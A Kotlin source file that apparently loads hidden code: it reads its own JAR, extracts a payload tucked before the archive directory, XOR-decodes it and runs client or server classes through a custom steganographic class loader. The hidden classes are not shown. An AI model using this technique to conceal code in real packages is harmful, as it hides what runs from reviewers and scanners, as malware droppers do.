import java.io.RandomAccessFile
import java.nio.ByteBuffer
import java.nio.ByteOrder
import kotlin.experimental.xor

fun main(args: Array<String>) {
    RealMain().main(args)
}

class RealMain(){
    fun main(args: Array<String>){
        val jarPath = RealMain::class.java.protectionDomain.codeSource.location.path;
        println("Hello")
        println(jarPath)
        val file = RandomAccessFile(jarPath, "r")
        val channel = file.channel
        val buffer = ByteBuffer.allocate(file.length().toInt())
        buffer.order(ByteOrder.LITTLE_ENDIAN)
        channel.read(buffer)
        buffer.flip()

//        file.seek(file.length() - 6)
        val dirOffset = buffer.getInt(file.length().toInt() - 6)
        println(dirOffset)

        file.seek(dirOffset.toLong()-4)
        val plStart = buffer.getInt(dirOffset-4)
        val plLength = dirOffset - 4 - plStart
        val ba = ByteArray(plLength)
        buffer.position(plStart)
        buffer.get(ba)
        println(ba.size)
        for (i  in 0 until ba.size){
            if(i % 4== 0){
                ba[i] = ba[i] xor 70
            }
            if(i % 4 == 1){
                ba[i] = ba[i] xor 117
            }
            if(i % 4== 2){
                ba[i] = ba[i] xor 67
            }
            if(i % 4 == 3){
                ba[i] = ba[i] xor 107
            }
        }
        for (clName in arrayOf("ru.leadpogrommer.sb.client.MainKt", "ru.leadpogrommer.sb.server.MainKt")){
            try {
                val cls = SteganoClassLoader(ByteBuffer.wrap(ba).also { it.order(ByteOrder.LITTLE_ENDIAN) }).loadClass(clName)
                cls.getMethod("main").invoke(null, )
            }catch (_: ClassNotFoundException){}
        }
    }
}

class SteganoClassLoader(val data: ByteBuffer): ClassLoader(){
    override fun loadClass(name: String): Class<*> {
        if (name.startsWith("java")){
            return super.loadClass(name)
        }
        data.position(0)
        while (data.position() < data.limit() - 1){
            val nl = data.getInt()
            val cnba = ByteArray(nl)
            data.get(cnba)
            val ds = data.getInt()
            println("Loading class, target = $name, current=${cnba.decodeToString()}")
            if(cnba.decodeToString() == name){
                println("Found")
                val class_ba = ByteArray(ds)
                data.get(class_ba)
                val c = defineClass(name, class_ba, 0, class_ba.size)
                resolveClass(c)
                return c
            }else{
                data.position(data.position() + ds)
            }
        }
        throw ClassNotFoundException()
    }
}

